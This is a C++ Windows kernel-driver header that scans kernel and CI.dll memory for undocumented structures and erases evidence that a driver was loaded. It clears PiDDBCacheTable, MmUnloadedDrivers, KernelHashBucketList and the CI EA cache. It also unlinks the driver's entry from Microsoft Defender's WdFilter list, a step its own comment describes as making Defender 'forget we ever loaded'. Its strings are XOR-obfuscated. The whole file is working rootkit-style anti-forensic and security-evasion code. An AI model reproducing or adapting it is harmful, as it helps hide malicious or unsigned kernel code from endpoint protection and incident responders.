#pragma once
#include "../base.h"
#include "utils.hpp"

constexpr unsigned int max_unloader_driver = 50;
typedef struct _unloader_information
{
	UNICODE_STRING name;
	PVOID module_start;
	PVOID module_end;
	ULONG64 unload_time;
} unloader_information, * punloader_information;

typedef struct _piddb_cache_entry
{
	LIST_ENTRY list;
	UNICODE_STRING name;
	ULONG stamp;
	NTSTATUS status;
	char _0x0028[16];
}piddb_cache_entry, * ppiddb_cache_entry;

typedef struct _hash_bucket_entry
{
	struct _hash_bucket_entry* next;
	UNICODE_STRING name;
	ULONG hash[5];
} hash_bucket_entry, * phash_bucket_entry;

namespace trace
{
	struct hash_bucket_globals
	{
		unsigned long long ci_base;
		unsigned long ci_size;
		unsigned long long pattern;
		unsigned long long hash_bucket_list;
		unsigned long long hash_cache_lock;
		unsigned long result;
	};

	static inline wchar_t lower_ascii_w(wchar_t ch)
	{
		if (ch >= L'A' && ch <= L'Z')
			return (wchar_t)(ch + (L'a' - L'A'));
		return ch;
	}

	static bool unicode_string_contains_i(const UNICODE_STRING& hay, const wchar_t* needle)
	{
		if (!hay.Buffer || !hay.Length || !needle || !needle[0])
			return false;
		if (MmIsAddressValid(hay.Buffer) == FALSE)
			return false;

		unsigned long needle_chars = 0;
		while (needle[needle_chars] && needle_chars < 260)
			++needle_chars;
		if (!needle_chars)
			return false;

		unsigned long hay_chars = hay.Length / sizeof(wchar_t);
		if (hay_chars > 512)
			hay_chars = 512;
		if (hay_chars < needle_chars)
			return false;

		for (unsigned long i = 0; i <= hay_chars - needle_chars; ++i)
		{
			bool match = true;
			for (unsigned long j = 0; j < needle_chars; ++j)
			{
				if (lower_ascii_w(hay.Buffer[i + j]) != lower_ascii_w(needle[j]))
				{
					match = false;
					break;
				}
			}
			if (match)
				return true;
		}

		return false;
	}

	bool resolve_hash_bucket_globals(hash_bucket_globals* out)
	{
		if (out)
			RtlZeroMemory(out, sizeof(*out));

		hash_bucket_globals local = {};

		utils::get_module_base_address(_XOR_("CI.dll"), local.ci_base, local.ci_size);
		if (local.ci_base == 0 || local.ci_size == 0)
		{
			local.result = 0x10;
			LOG_DEBUG(_XOR_("[trace::hash] FAIL: CI.dll base not found\n"));
			if (out) *out = local;
			return false;
		}

		local.pattern = utils::find_pattern_image(local.ci_base,
			"\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00",
			"xxx????x?xxxxxxx");
		if (local.pattern == 0)
		{
			local.result = 0x20;
			LOG_DEBUG(_XOR_("[trace::hash] FAIL: KernelHashBucketList pattern not found ci=0x%llX size=0x%X\n"),
				local.ci_base, local.ci_size);
			if (out) *out = local;
			return false;
		}

		if (local.pattern < local.ci_base + 0x13)
		{
			local.result = 0x21;
			LOG_DEBUG(_XOR_("[trace::hash] FAIL: HashCacheLock ref underflow pattern=0x%llX ci=0x%llX\n"),
				local.pattern, local.ci_base);
			if (out) *out = local;
			return false;
		}

		unsigned long long hash_cache_lock_ref = 0;
		auto resolve_rip_target = [](unsigned long long insn_va) -> unsigned long long
		{
			return reinterpret_cast<unsigned long long>(
				reinterpret_cast<char*>(insn_va) + 7 +
				*reinterpret_cast<int*>(reinterpret_cast<char*>(insn_va) + 3));
		};
		auto is_in_ci_image = [&](unsigned long long va) -> bool
		{
			return va >= local.ci_base && va < (local.ci_base + local.ci_size);
		};

		unsigned long long scan_min = (local.pattern > local.ci_base + 0x40)
			? (local.pattern - 0x40)
			: local.ci_base;
		for (unsigned long long cur = local.pattern - 7; cur >= scan_min; --cur)
		{
			const unsigned char* bytes = reinterpret_cast<const unsigned char*>(cur);
			if (bytes[0] == 0x48 && bytes[1] == 0x8D && bytes[2] == 0x0D)
			{
				unsigned long long target = resolve_rip_target(cur);
				if (is_in_ci_image(target))
				{
					hash_cache_lock_ref = cur;
					break;
				}
			}
			if (cur == scan_min)
				break;
		}

		local.hash_bucket_list = resolve_rip_target(local.pattern);
		local.hash_cache_lock = hash_cache_lock_ref ? resolve_rip_target(hash_cache_lock_ref) : 0;

		if (!is_in_ci_image(local.hash_bucket_list) || !is_in_ci_image(local.hash_cache_lock))
		{
			local.result = 0x22;
			LOG_DEBUG(_XOR_("[trace::hash] FAIL: resolved invalid list=0x%llX lock=0x%llX pattern=0x%llX\n"),
				local.hash_bucket_list, local.hash_cache_lock, local.pattern);
			if (out) *out = local;
			return false;
		}

		local.result = 0;
		LOG_DEBUG(_XOR_("[trace::hash] resolved ci=0x%llX size=0x%X pattern=0x%llX list=0x%llX lock=0x%llX\n"),
			local.ci_base,
			local.ci_size,
			local.pattern,
			local.hash_bucket_list,
			local.hash_cache_lock);
		if (out) *out = local;
		return true;
	}

	bool clear_cache(const wchar_t* name, unsigned long stamp)
	{
		bool status = false;

		unsigned long long ntoskrnl_address = 0;
		unsigned long ntoskrnl_size = 0;
		utils::get_module_base_address(_XOR_("ntoskrnl.exe"), ntoskrnl_address, ntoskrnl_size);
		if (ntoskrnl_address == 0 || ntoskrnl_size == 0)
		{
			LOG_DEBUG(_XOR_("[trace::clear_cache] FAIL: ntoskrnl not found name=%ws stamp=0x%X\n"),
				name, stamp);
			return status;
		}

		unsigned long long PiDDBLock = utils::find_pattern_image(ntoskrnl_address,
			"\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x8C",
			"xxx????x????xxx");
		if (PiDDBLock == 0)
		{
			LOG_DEBUG(_XOR_("[trace::clear_cache] FAIL: PiDDBLock pattern not found name=%ws stamp=0x%X\n"),
				name, stamp);
			return status;
		}
		PiDDBLock = reinterpret_cast<unsigned long long>(reinterpret_cast<char*>(PiDDBLock) + 7 + *reinterpret_cast<int*>(reinterpret_cast<char*>(PiDDBLock) + 3));

		unsigned long long PiDDBCacheTable = utils::find_pattern_image(ntoskrnl_address,
			"\x66\x03\xD2\x48\x8D\x0D",
			"xxxxxx");
		if (PiDDBCacheTable == 0)
		{
			LOG_DEBUG(_XOR_("[trace::clear_cache] FAIL: PiDDBCacheTable pattern not found name=%ws stamp=0x%X\n"),
				name, stamp);
			return status;
		}
		PiDDBCacheTable += 3;
		PiDDBCacheTable = reinterpret_cast<unsigned long long>(reinterpret_cast<char*>(PiDDBCacheTable) + 7 + *reinterpret_cast<int*>(reinterpret_cast<char*>(PiDDBCacheTable) + 3));

		piddb_cache_entry in_entry{ };
		in_entry.stamp = stamp;
		RtlInitUnicodeString(&in_entry.name, name);

		LOG_DEBUG(_XOR_("[trace::clear_cache] resolved lock=0x%llX table=0x%llX name=%ws stamp=0x%X\n"),
			PiDDBLock, PiDDBCacheTable, name, stamp);

		if (ExAcquireResourceExclusiveLite((PERESOURCE)PiDDBLock, TRUE))
		{
			ppiddb_cache_entry ret_entry = (ppiddb_cache_entry)RtlLookupElementGenericTableAvl((PRTL_AVL_TABLE)PiDDBCacheTable, &in_entry);
			if (ret_entry)
			{
				LOG_DEBUG(_XOR_("[trace::clear_cache] found %ws\n"), ret_entry->name.Buffer);
				PLIST_ENTRY prev = ret_entry->list.Blink;
				PLIST_ENTRY next = ret_entry->list.Flink;
				if (prev && next)
				{
					prev->Flink = next;
					next->Blink = prev;
				}

				if (RtlDeleteElementGenericTableAvl((PRTL_AVL_TABLE)PiDDBCacheTable, ret_entry))
				{
					PRTL_AVL_TABLE avl = ((PRTL_AVL_TABLE)PiDDBCacheTable);
					if (avl->DeleteCount > 0) avl->DeleteCount--;
					status = true;
				}
			}
			else
			{
				LOG_DEBUG(_XOR_("[trace::clear_cache] no match name=%ws stamp=0x%X table=0x%llX\n"),
					name, stamp, PiDDBCacheTable);
			}

			ExReleaseResourceLite((PERESOURCE)PiDDBLock);
		}
		else
		{
			LOG_DEBUG(_XOR_("[trace::clear_cache] FAIL: acquire lock=0x%llX name=%ws stamp=0x%X\n"),
				PiDDBLock, name, stamp);
		}

		return status;
	}

	bool clear_unloaded_driver(const wchar_t* name)
	{
		bool status = false;

		unsigned long long ntoskrnl_address = 0;
		unsigned long ntoskrnl_size = 0;
		utils::get_module_base_address(_XOR_("ntoskrnl.exe"), ntoskrnl_address, ntoskrnl_size);
		if (ntoskrnl_address == 0 || ntoskrnl_size == 0) return status;

		unsigned long long MmUnloadedDrivers = utils::find_pattern_image(ntoskrnl_address,
			"\x4C\x8B\x15\x00\x00\x00\x00\x4C\x8B\xC9",
			"xxx????xxx");
		if (MmUnloadedDrivers == 0) return status;
		MmUnloadedDrivers = reinterpret_cast<unsigned long long>(reinterpret_cast<char*>(MmUnloadedDrivers) + 7 + *reinterpret_cast<int*>(reinterpret_cast<char*>(MmUnloadedDrivers) + 3));

		unsigned long long MmLastUnloadedDriver = utils::find_pattern_image(ntoskrnl_address,
			"\x8B\x05\x00\x00\x00\x00\x83\xF8\x32",
			"xx????xxx");
		if (MmLastUnloadedDriver == 0) return status;
		MmLastUnloadedDriver = reinterpret_cast<unsigned long long>(reinterpret_cast<char*>(MmLastUnloadedDriver) + 6 + *reinterpret_cast<int*>(reinterpret_cast<char*>(MmLastUnloadedDriver) + 2));

		punloader_information unloaders = *(punloader_information*)MmUnloadedDrivers;
		unsigned long* unloaders_count = (unsigned long*)MmLastUnloadedDriver;
		if (MmIsAddressValid(unloaders) == FALSE || MmIsAddressValid(unloaders_count) == FALSE) return status;

		// Do not acquire a locally declared ERESOURCE here. The historical code
		// used an uninitialized static resource, which is unsafe. This cleanup is
		// best-effort and is also repeated later from the resident VT path after
		// DriverEntry returns failure and the real MmUnloadedDrivers entry exists.
		for (unsigned long i = 0; i < *unloaders_count && i < max_unloader_driver; i++)
		{
			unloader_information& t = unloaders[i];
			const wchar_t* sys = t.name.Buffer;
			if (sys && wcsstr(sys, name))
			{
				LOG_DEBUG(_XOR_("[trace::clear_unloaded_driver] found %ws\n"), t.name.Buffer);
				t.module_start = nullptr;
				t.module_end = nullptr;
				t.unload_time = 0;
				if (t.name.Buffer && t.name.Length >= sizeof(wchar_t))
				{
					RtlSecureZeroMemory(t.name.Buffer, t.name.Length);
				}
				t.name.Length = 0;
				t.name.MaximumLength = 0;
				t.name.Buffer = nullptr;
				status = true;
			}
		}

		return status;
	}

	bool clear_hash_bucket_list(const wchar_t* name)
	{
		bool status = false;

		hash_bucket_globals globals = {};
		if (!resolve_hash_bucket_globals(&globals))
			return status;

		unsigned long long KernelHashBucketList = globals.hash_bucket_list;
		unsigned long long HashCacheLock = globals.hash_cache_lock;
		if (MmIsAddressValid((PVOID)KernelHashBucketList) == FALSE ||
			MmIsAddressValid((PVOID)HashCacheLock) == FALSE)
		{
			LOG_DEBUG(_XOR_("[trace::clear_hash_bucket_list] FAIL: invalid globals list=0x%llX lock=0x%llX name=%ws\n"),
				KernelHashBucketList, HashCacheLock, name);
			return status;
		}

		if (ExAcquireResourceExclusiveLite((PERESOURCE)HashCacheLock, TRUE))
		{
			phash_bucket_entry current_entry = ((phash_bucket_entry)KernelHashBucketList)->next;
			phash_bucket_entry prev_entry = (phash_bucket_entry)KernelHashBucketList;
			unsigned long walked = 0;

			while (current_entry && walked < 4096)
			{
				if (MmIsAddressValid(current_entry) == FALSE)
				{
					LOG_DEBUG(_XOR_("[trace::clear_hash_bucket_list] FAIL: invalid entry=0x%p walked=%lu list=0x%llX\n"),
						current_entry, walked, KernelHashBucketList);
					break;
				}

				if (unicode_string_contains_i(current_entry->name, name))
				{
					LOG_DEBUG(_XOR_("[trace::clear_hash_bucket_list] found entry=0x%p name=%wZ walked=%lu\n"),
						current_entry, &current_entry->name, walked);
					prev_entry->next = current_entry->next;
					current_entry->hash[0] = current_entry->hash[1] = 1;
					current_entry->hash[2] = current_entry->hash[3] = 1;
					current_entry->hash[4] = 1;
					if (current_entry->name.Buffer &&
						current_entry->name.Length &&
						MmIsAddressValid(current_entry->name.Buffer) != FALSE)
					{
						RtlSecureZeroMemory(current_entry->name.Buffer, current_entry->name.Length);
					}
					current_entry->name.Length = 0;
					current_entry->name.MaximumLength = 0;
					current_entry->name.Buffer = nullptr;
					ExFreePoolWithTag(current_entry, 0);
					status = true;
					break;
				}
				else
				{
					prev_entry = current_entry;
					current_entry = current_entry->next;
				}
				++walked;
			}

			if (!status)
			{
				LOG_DEBUG(_XOR_("[trace::clear_hash_bucket_list] no match name=%ws walked=%lu head=0x%llX first=0x%p\n"),
					name, walked, KernelHashBucketList, ((phash_bucket_entry)KernelHashBucketList)->next);
			}

			ExReleaseResourceLite((PERESOURCE)HashCacheLock);
		}
		else
		{
			LOG_DEBUG(_XOR_("[trace::clear_hash_bucket_list] FAIL: acquire lock=0x%llX name=%ws\n"),
				HashCacheLock, name);
		}

		return status;
	}

	// Resolve a RIP-relative operand to an absolute address.
	//   addr            — start of the instruction
	//   operand_offset  — bytes from addr to the 32-bit signed operand
	//   instr_length    — total length of the instruction (used as the
	//                     base for sign-extended displacement)
	// e.g. `mov rcx, cs:[rip+disp32]` is `48 8B 0D dd dd dd dd`, length 7,
	// operand at +3, so ResolveRelativeAddress(addr, 3, 7).
	static inline unsigned long long resolve_rel_addr(unsigned long long addr,
	                                                  unsigned int operand_offset,
	                                                  unsigned int instr_length)
	{
		int disp = *reinterpret_cast<int*>(addr + operand_offset);
		return addr + instr_length + (long long)disp;
	}

	// Clear an entry from WdFilter's RuntimeDriversList / RuntimeDriversArray
	// so Microsoft Defender's mini-filter forgets we ever loaded.
	// Adapted from TheCruZ/kdmapper ClearWdFilterDriverList (intel_driver.cpp),
	// but we're in ring 0 so we deref kernel memory directly instead of routing
	// every read/write through a vulnerable Intel driver.
	//
	//   driver_name — substring matched against each entry's UNICODE_STRING.
	//                 mapDriver passes our driver's BaseDllName.
	//
	// Returns true on a clean removal, false on any pattern miss / no match /
	// failed unlink. Detailed LOG_DEBUG at every step so we can verify on the
	// target host whether wdfilter version still matches expected layout.
	bool clear_wdfilter_runtime_drivers(const wchar_t* driver_name)
	{
		bool status = false;

		unsigned long long wdfilter = 0;
		unsigned long      wdfilter_size = 0;
		utils::get_module_base_address(_XOR_("WdFilter.sys"), wdfilter, wdfilter_size);
		if (!wdfilter || !wdfilter_size) {
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] WdFilter.sys not loaded — Defender absent, skip\n"));
			return true;  // nothing to clean is "success" semantically
		}
		LOG_DEBUG(_XOR_("[trace::clear_wdfilter] WdFilter base=0x%llX size=0x%X\n"),
			wdfilter, wdfilter_size);

		// === Pattern 1: RuntimeDriversList ===
		// 48 8B 0D ?? ?? ?? ?? FF 05   mov rcx,cs:RuntimeDriversList ; inc dword cs:Count
		unsigned long long ref_list = utils::find_pattern_image(wdfilter,
			"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
		if (!ref_list) {
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] FAIL: RuntimeDriversList pattern not found\n"));
			return false;
		}
		LOG_DEBUG(_XOR_("[trace::clear_wdfilter] RuntimeDriversList ref @ 0x%llX\n"), ref_list);

		// === Pattern 2: RuntimeDriversCountRef ===
		// FF 05 ?? ?? ?? ?? 48 39 11   inc dword cs:Count ; cmp [rcx],rdx
		unsigned long long ref_count = utils::find_pattern_image(wdfilter,
			"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
		if (!ref_count) {
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] FAIL: RuntimeDriversCount pattern not found\n"));
			return false;
		}
		LOG_DEBUG(_XOR_("[trace::clear_wdfilter] RuntimeDriversCount ref @ 0x%llX\n"), ref_count);

		// === Pattern 3: MpFreeDriverInfoEx call site ===
		// mov [reg+8], reg ; call MpFreeDriverInfoEx ; ... jmp
		unsigned long long ref_free = utils::find_pattern_image(wdfilter,
			"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9",
			"x?xx???????????x");
		bool second_pattern = false;
		if (!ref_free) {
			ref_free = utils::find_pattern_image(wdfilter,
				"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9",
				"x?x???x???????????x");
			if (ref_free) {
				second_pattern = true;
				LOG_DEBUG(_XOR_("[trace::clear_wdfilter] MpFreeDriverInfoEx matched second pattern\n"));
				ref_free += 0x3;  // adjust for second-pattern layout
			}
		}
		if (!ref_free) {
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] FAIL: MpFreeDriverInfoEx pattern not found\n"));
			return false;
		}
		ref_free += 0x3;  // skip past `mov [r8+8], rdx` to the `call` instruction
		LOG_DEBUG(_XOR_("[trace::clear_wdfilter] MpFreeDriverInfoEx ref @ 0x%llX (second_pattern=%d)\n"),
			ref_free, (int)second_pattern);

		// === Resolve relative operands to absolute addresses ===
		unsigned long long RuntimeDriversList = resolve_rel_addr(ref_list, 3, 7);
		unsigned long long RuntimeDriversList_Head = RuntimeDriversList - 0x8;
		unsigned long long RuntimeDriversCount = resolve_rel_addr(ref_count, 2, 6);
		unsigned long long RuntimeDriversArray_Ptr = RuntimeDriversCount + 0x8;
		unsigned long long RuntimeDriversArray = *(unsigned long long*)RuntimeDriversArray_Ptr;
		unsigned long long MpFreeDriverInfoEx = resolve_rel_addr(ref_free, 1, 5);

		LOG_DEBUG(_XOR_("[trace::clear_wdfilter] List_Head=0x%llX Count=0x%llX Array=0x%llX FreeFn=0x%llX\n"),
			RuntimeDriversList_Head, RuntimeDriversCount,
			RuntimeDriversArray, MpFreeDriverInfoEx);

		// === Walk the list and find our entry ===
		LIST_ENTRY* head = (LIST_ENTRY*)RuntimeDriversList_Head;
		unsigned int walked = 0;
		for (LIST_ENTRY* entry = head->Flink; entry != head && walked < 1024; entry = entry->Flink) {
			walked++;
			// entry+0x10 is a UNICODE_STRING (driver name)
			UNICODE_STRING* name_us = (UNICODE_STRING*)((uintptr_t)entry + 0x10);
			if (!name_us->Buffer || !name_us->Length) continue;

			// Quick safety: copy to local buffer for case-insensitive substring
			wchar_t local_name[260] = {};
			ULONG copy_len = name_us->Length;
			if (copy_len >= sizeof(local_name) - sizeof(wchar_t))
				copy_len = sizeof(local_name) - sizeof(wchar_t);
			memcpy(local_name, name_us->Buffer, copy_len);

			UNICODE_STRING local_us = {};
			local_us.Buffer = local_name;
			local_us.Length = (USHORT)copy_len;
			local_us.MaximumLength = sizeof(local_name);
			if (!unicode_string_contains_i(local_us, driver_name)) continue;

			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] MATCH @ entry=0x%p name=%ws (walked %u entries)\n"),
				entry, local_name, walked);

			// === Remove from RuntimeDriversArray ===
			// Each array slot holds a pointer to (entry - 0x10). Replace match
			// with a sentinel value so wdfilter's own array sweeps skip it.
			PVOID same_index = (PVOID)((uintptr_t)entry - 0x10);
			bool array_removed = false;
			for (int k = 0; k < 256; k++) {
				PVOID slot_val = ((PVOID*)RuntimeDriversArray)[k];
				if (slot_val == same_index) {
					PVOID sentinel = (PVOID)(RuntimeDriversCount + 1);  // not count+1, sentinel addr
					((PVOID*)RuntimeDriversArray)[k] = sentinel;
					array_removed = true;
					LOG_DEBUG(_XOR_("[trace::clear_wdfilter] removed from Array slot %d\n"), k);
					break;
				}
			}
			if (!array_removed) {
				LOG_DEBUG(_XOR_("[trace::clear_wdfilter] FAIL: not found in Array (max 256)\n"));
				return false;
			}

			// === Unlink the LIST_ENTRY ===
			LIST_ENTRY* next = entry->Flink;
			LIST_ENTRY* prev = entry->Blink;
			next->Blink = prev;
			prev->Flink = next;
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] unlinked (prev=0x%p next=0x%p)\n"), prev, next);

			// === Decrement RuntimeDriversCount ===
			ULONG* count_ptr = (ULONG*)RuntimeDriversCount;
			ULONG before = *count_ptr;
			(*count_ptr)--;
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] count %u → %u\n"), before, *count_ptr);

			// === Call MpFreeDriverInfoEx(DriverInfo) ===
			// DriverInfo lives 0x20 bytes before the list entry. First USHORT
			// is a magic value (0xDA18 on current wdfilter); if mismatch, skip
			// the free to avoid BSOD on a new wdfilter layout.
			uintptr_t DriverInfo = (uintptr_t)entry - 0x20;
			USHORT magic = *(USHORT*)DriverInfo;
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] DriverInfo=0x%llX magic=0x%04X (expected 0xDA18)\n"),
				(unsigned long long)DriverInfo, magic);
			if (magic == 0xDA18) {
				using FreeFn = void(__fastcall*)(PVOID);
				((FreeFn)MpFreeDriverInfoEx)((PVOID)DriverInfo);
				LOG_DEBUG(_XOR_("[trace::clear_wdfilter] MpFreeDriverInfoEx called OK\n"));
			} else {
				LOG_DEBUG(_XOR_("[trace::clear_wdfilter] magic mismatch — skip free (new wdfilter version?)\n"));
			}

			status = true;
			break;
		}

		if (!status) {
			LOG_DEBUG(_XOR_("[trace::clear_wdfilter] no match for '%ws' after walking %u entries\n"),
				driver_name, walked);
		}
		return status;
	}

	bool clear_ci_ea_cache_lookaside_list()
	{
		bool status = false;

		unsigned long long ci_address = 0;
		unsigned long ci_size = 0;
		utils::get_module_base_address(_XOR_("CI.dll"), ci_address, ci_size);
		if (ci_address == 0 || ci_size == 0) return status;

		unsigned long long CiEaCacheLookasideList = utils::find_pattern_image(ci_address,
			"\x8B\x15\x00\x00\x00\x00\x48\x8B\x05\x00\x00\x00\x00\x44\x8B\x05\x00\x00\x00\x00\x8B\x0D\x00\x00\x00\x00\xFF\x05\x00\x00\x00\x00\xFF\x15",
			"xx????xxx????xxx????xx????xx????xx");
		if (CiEaCacheLookasideList == 0) return status;
		CiEaCacheLookasideList -= 0x1B;
		CiEaCacheLookasideList = reinterpret_cast<unsigned long long>(reinterpret_cast<char*>(CiEaCacheLookasideList) + 7 + *reinterpret_cast<int*>(reinterpret_cast<char*>(CiEaCacheLookasideList) + 3));

		PLOOKASIDE_LIST_EX g_CiEaCacheLookasideList = (PLOOKASIDE_LIST_EX)CiEaCacheLookasideList;
		ULONG size = g_CiEaCacheLookasideList->L.Size;
		ExDeleteLookasideListEx(g_CiEaCacheLookasideList);
		if (NT_SUCCESS(ExInitializeLookasideListEx(g_CiEaCacheLookasideList, NULL, NULL, PagedPool, 0, size, 'csIC', 0)))
		{
			LOG_DEBUG(_XOR_("[trace::clear_ci_ea] done\n"));
			status = true;
		}

		return status;
	}
}
